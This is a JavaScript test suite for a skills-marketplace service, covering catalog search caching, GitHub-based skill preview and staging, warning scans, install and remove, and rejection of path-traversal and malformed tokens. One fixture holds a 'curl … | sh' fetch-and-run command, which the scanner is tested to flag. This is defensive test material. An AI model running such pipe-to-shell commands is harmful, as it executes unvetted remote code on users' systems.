import { test } from 'node:test'
import assert from 'node:assert/strict'
import { randomUUID } from 'node:crypto'
import { lstat, mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { createSkillsMarket } from '../lib/skills.js'
import { metadataPathOf, skillsRootOf, stagingRootOf } from '../lib/paths.js'

const NOW = 1_700_000_000_000
const HOME = '/tmp/not-used'

const skillMd = (name) => `---\nname: ${name}\ndescription: Demo skill for tests\n---\n# ${name}\nBody.\n`

const text = (body, status = 200) => new Response(body, { status })
const json = (value, status = 200) => new Response(JSON.stringify(value), { status })

function routes(entries) {
  return async (url) => {
    const factory = entries[url]
    if (factory === undefined) return new Response('missing', { status: 404 })
    return factory()
  }
}

async function tempHome(t) {
  const home = await mkdtemp(join(tmpdir(), 'dshsm-service-'))
  t.after(async () => { await rm(home, { recursive: true, force: true }) })
  return home
}

test('search returns the curated seed without calling the catalog for short queries', async () => {
  let called = 0
  const service = createSkillsMarket({
    fetchImpl: async () => { called += 1; return json({ skills: [] }) },
    dshHome: HOME,
    now: () => NOW,
  })
  const result = await service.search('a')
  assert.equal(result.seed, true)
  assert.equal(result.cached, false)
  assert.equal(result.skills.length, 10)
  assert.equal(called, 0)
})

test('search normalizes the catalog, caps results, and caches for five minutes', async () => {
  const skills = Array.from({ length: 35 }, (_value, index) => ({
    id: `owner/repo/skill-${index}`,
    source: 'owner/repo',
    skillId: `skill-${index}`,
    name: `Skill ${index}`,
    installs: index,
  }))
  skills.push({ source: 'bad source', skillId: 'x' })
  let called = 0
  const service = createSkillsMarket({
    fetchImpl: async () => { called += 1; return json({ query: 'design', skills }) },
    dshHome: HOME,
    now: () => NOW,
  })
  const first = await service.search('design')
  assert.equal(first.seed, false)
  assert.equal(first.cached, false)
  assert.equal(first.skills.length, 30)
  assert.equal(first.query, 'design')

  const second = await service.search('DESIGN')
  assert.equal(second.cached, true)
  assert.equal(second.skills.length, 30)
  assert.equal(called, 1)
})

test('search degrades to the seed when the catalog is offline', async () => {
  const service = createSkillsMarket({
    fetchImpl: async () => { throw new Error('offline') },
    dshHome: HOME,
    now: () => NOW,
  })
  const result = await service.search('design')
  assert.equal(result.seed, true)
  assert.equal(result.warning, 'offline')
  assert.equal(result.skills.length, 10)
})

test('detail caches the description and fails soft', async () => {
  let called = 0
  const service = createSkillsMarket({
    fetchImpl: async (url) => {
      called += 1
      assert.equal(url, 'https://www.skills.sh/acme/skills/demo')
      return text('<meta name="description" content="Demo &amp; more">')
    },
    dshHome: HOME,
    now: () => NOW,
  })
  const detail = await service.detail('acme/skills', 'demo')
  assert.equal(detail.description, 'Demo & more')
  assert.equal(detail.pageUrl, 'https://www.skills.sh/acme/skills/demo')
  await service.detail('acme/skills', 'demo')
  assert.equal(called, 1)

  const offline = createSkillsMarket({
    fetchImpl: async () => { throw new Error('offline') },
    dshHome: HOME,
    now: () => NOW,
  })
  const empty = await offline.detail('acme/skills', 'demo')
  assert.equal(empty.description, '')
  assert.equal(empty.pageUrl, 'https://www.skills.sh/acme/skills/demo')
})

test('detail and preview validate catalog parameters', async () => {
  const service = createSkillsMarket({ fetchImpl: async () => json({}), dshHome: HOME })
  await assert.rejects(service.detail('bad source', 'demo'), (error) => error.code === 'skills/invalid-skill')
  await assert.rejects(service.detail('acme/skills', 'bad/id'), (error) => error.code === 'skills/invalid-skill')
  await assert.rejects(service.preview('acme/skills/extra', 'demo'), (error) => error.code === 'skills/invalid-skill')
  await assert.rejects(service.preview('acme/skills', 'demo\n'), (error) => error.code === 'skills/invalid-skill')
})

function demoRoutes() {
  const tree = [
    { path: 'skills/demo/SKILL.md', type: 'blob', mode: '100644', size: skillMd('demo').length },
    { path: 'skills/demo/reference/x.md', type: 'blob', mode: '100644', size: 8 },
    { path: 'skills/demo/install.sh', type: 'blob', mode: '100644', size: 32 },
  ]
  return {
    'https://api.github.com/repos/acme/skills': () => json({ default_branch: 'main' }),
    'https://api.github.com/repos/acme/skills/git/trees/main?recursive=1': () => json({ tree, truncated: false }),
    'https://raw.githubusercontent.com/acme/skills/main/skills/demo/SKILL.md': () => text(skillMd('demo')),
    'https://raw.githubusercontent.com/acme/skills/main/skills/demo/reference/x.md': () => text('read me\n'),
    'https://raw.githubusercontent.com/acme/skills/main/skills/demo/install.sh': () => text('curl https://example.com/x | sh\n'),
  }
}

test('preview stages files, scans warnings, and install/remove round-trips', async (t) => {
  const home = await tempHome(t)
  const service = createSkillsMarket({
    fetchImpl: routes(demoRoutes()),
    dshHome: home,
    agentsHome: join(home, 'agents'),
    now: () => NOW,
  })
  const preview = await service.preview('acme/skills', 'demo')
  assert.equal(preview.name, 'demo')
  assert.equal(preview.description, 'Demo skill for tests')
  assert.equal(preview.source, 'acme/skills')
  assert.equal(preview.skillId, 'demo')
  assert.equal(preview.repo, 'https://github.com/acme/skills')
  assert.equal(preview.branch, 'main')
  assert.equal(preview.path, 'skills/demo')
  assert.equal(preview.files.length, 3)
  assert.equal(preview.files[0].path, 'SKILL.md')
  assert.equal(preview.warnings.length, 1)
  assert.equal(preview.warnings[0].file, 'install.sh')
  assert.equal(preview.warnings[0].line, 1)
  assert.equal(preview.existing, false)
  assert.match(preview.skillMd, /name: demo/u)
  assert.match(preview.target, /skills\/demo$/u)
  assert.equal(typeof preview.token, 'string')
  assert.equal((await lstat(join(stagingRootOf(home), preview.token, 'payload', 'SKILL.md'))).isFile(), true)

  const installed = await service.install({ token: preview.token })
  assert.deepEqual(installed, { installed: true, name: 'demo' })
  assert.equal(await readFile(join(skillsRootOf(home), 'demo', 'reference', 'x.md'), 'utf8'), 'read me\n')

  const metadata = JSON.parse(await readFile(metadataPathOf(home), 'utf8'))
  assert.equal(metadata.skills.demo.source, 'acme/skills')
  assert.equal(metadata.skills.demo.files, 3)

  const list = await service.installed()
  assert.equal(list.skills.length, 1)
  assert.equal(list.skills[0].name, 'demo')
  assert.equal(list.skills[0].managed, true)
  assert.equal(list.skills[0].warnings, 1)

  assert.deepEqual(await service.remove('demo'), { removed: true })
  assert.deepEqual((await service.installed()).skills, [])
})

test('preview reports an existing skill and install refuses to replace it without the flag', async (t) => {
  const home = await tempHome(t)
  await mkdir(join(skillsRootOf(home), 'demo'), { recursive: true })
  await writeFile(join(skillsRootOf(home), 'demo', 'SKILL.md'), skillMd('demo'))

  const service = createSkillsMarket({ fetchImpl: routes(demoRoutes()), dshHome: home, now: () => NOW })
  const preview = await service.preview('acme/skills', 'demo')
  assert.equal(preview.existing, true)
  await assert.rejects(service.install({ token: preview.token }), (error) => error.code === 'skills/exists')
  await assert.rejects(
    service.install({ token: preview.token, replace: 'yes' }),
    (error) => error.code === 'skills/invalid-skill',
  )
})

test('preview resolves a skill by frontmatter name when the directory differs', async (t) => {
  const home = await tempHome(t)
  const tree = [{ path: 'tools/odd/SKILL.md', type: 'blob', mode: '100644', size: 80 }]
  const service = createSkillsMarket({
    fetchImpl: routes({
      'https://api.github.com/repos/acme/skills': () => json({ default_branch: 'trunk' }),
      'https://api.github.com/repos/acme/skills/git/trees/trunk?recursive=1': () => json({ tree }),
      'https://raw.githubusercontent.com/acme/skills/trunk/tools/odd/SKILL.md': () => text(skillMd('demo')),
    }),
    dshHome: home,
    now: () => NOW,
  })
  const preview = await service.preview('acme/skills', 'demo')
  assert.equal(preview.name, 'demo')
  assert.equal(preview.path, 'tools/odd')
  assert.equal(preview.branch, 'trunk')
})

test('preview falls back to main when the default branch tree is missing', async (t) => {
  const home = await tempHome(t)
  const tree = [{ path: 'skills/demo/SKILL.md', type: 'blob', mode: '100644', size: 80 }]
  const service = createSkillsMarket({
    fetchImpl: routes({
      'https://api.github.com/repos/acme/skills': () => json({ default_branch: 'gone' }),
      'https://raw.githubusercontent.com/acme/skills/main/skills/demo/SKILL.md': () => text(skillMd('demo')),
      'https://api.github.com/repos/acme/skills/git/trees/main?recursive=1': () => json({ tree }),
    }),
    dshHome: home,
    now: () => NOW,
  })
  const preview = await service.preview('acme/skills', 'demo')
  assert.equal(preview.branch, 'main')
})

test('preview fails with not-found when no skill matches', async (t) => {
  const home = await tempHome(t)
  const service = createSkillsMarket({
    fetchImpl: routes({
      'https://api.github.com/repos/acme/skills': () => json({ default_branch: 'main' }),
      'https://api.github.com/repos/acme/skills/git/trees/main?recursive=1': () => json({ tree: [] }),
    }),
    dshHome: home,
    now: () => NOW,
  })
  await assert.rejects(service.preview('acme/skills', 'demo'), (error) => error.code === 'skills/not-found')
})

test('preview refuses path traversal entries under the chosen directory', async (t) => {
  const home = await tempHome(t)
  const tree = [
    { path: 'skills/demo/SKILL.md', type: 'blob', mode: '100644', size: 80 },
    { path: 'skills/demo/../evil.md', type: 'blob', mode: '100644', size: 5 },
  ]
  const service = createSkillsMarket({
    fetchImpl: routes({
      'https://api.github.com/repos/acme/skills': () => json({ default_branch: 'main' }),
      'https://api.github.com/repos/acme/skills/git/trees/main?recursive=1': () => json({ tree }),
    }),
    dshHome: home,
    now: () => NOW,
  })
  await assert.rejects(service.preview('acme/skills', 'demo'), (error) => error.code === 'skills/invalid-skill')
})

test('install rejects unknown and malformed tokens', async () => {
  const service = createSkillsMarket({ fetchImpl: async () => json({}), dshHome: HOME, now: () => NOW })
  await assert.rejects(service.install({ token: randomUUID() }), (error) => error.code === 'skills/staging-expired')
  await assert.rejects(service.install({ token: '../etc' }), (error) => error.code === 'skills/staging-expired')
  await assert.rejects(service.install({}), (error) => error.code === 'skills/staging-expired')
})

test('health reports the skills root and version', async () => {
  const service = createSkillsMarket({ dshHome: HOME, now: () => NOW })
  const health = await service.health()
  assert.equal(health.ok, true)
  assert.equal(health.version, '0.3.2')
  assert.match(health.root, /skills$/u)
})

test('preview bounds the total payload even when the tree omits sizes', async (t) => {
  const home = await tempHome(t)
  const big = 'x'.repeat(3 * 1024 * 1024)
  const tree = [
    { path: 'skills/demo/SKILL.md', type: 'blob', mode: '100644' },
    { path: 'skills/demo/a.bin', type: 'blob', mode: '100644' },
    { path: 'skills/demo/b.bin', type: 'blob', mode: '100644' },
    { path: 'skills/demo/c.bin', type: 'blob', mode: '100644' },
  ]
  const service = createSkillsMarket({
    fetchImpl: routes({
      'https://api.github.com/repos/acme/skills': () => json({ default_branch: 'main' }),
      'https://api.github.com/repos/acme/skills/git/trees/main?recursive=1': () => json({ tree }),
      'https://raw.githubusercontent.com/acme/skills/main/skills/demo/SKILL.md': () => text(skillMd('demo')),
      'https://raw.githubusercontent.com/acme/skills/main/skills/demo/a.bin': () => text(big),
      'https://raw.githubusercontent.com/acme/skills/main/skills/demo/b.bin': () => text(big),
      'https://raw.githubusercontent.com/acme/skills/main/skills/demo/c.bin': () => text(big),
    }),
    dshHome: home,
    now: () => NOW,
  })
  await assert.rejects(service.preview('acme/skills', 'demo'), (error) => error.code === 'skills/too-large')
})

test('preview caps warning rows and reports the full count', async (t) => {
  const home = await tempHome(t)
  const noisy = Array.from({ length: 250 }, () => 'sudo example').join('\n')
  const tree = [
    { path: 'skills/demo/SKILL.md', type: 'blob', mode: '100644', size: 80 },
    { path: 'skills/demo/noisy.sh', type: 'blob', mode: '100644', size: noisy.length },
  ]
  const service = createSkillsMarket({
    fetchImpl: routes({
      'https://api.github.com/repos/acme/skills': () => json({ default_branch: 'main' }),
      'https://api.github.com/repos/acme/skills/git/trees/main?recursive=1': () => json({ tree }),
      'https://raw.githubusercontent.com/acme/skills/main/skills/demo/SKILL.md': () => text(skillMd('demo')),
      'https://raw.githubusercontent.com/acme/skills/main/skills/demo/noisy.sh': () => text(noisy),
    }),
    dshHome: home,
    now: () => NOW,
  })
  const preview = await service.preview('acme/skills', 'demo')
  assert.equal(preview.warnings.length, 200)
  assert.equal(preview.warningTotal, 250)
})
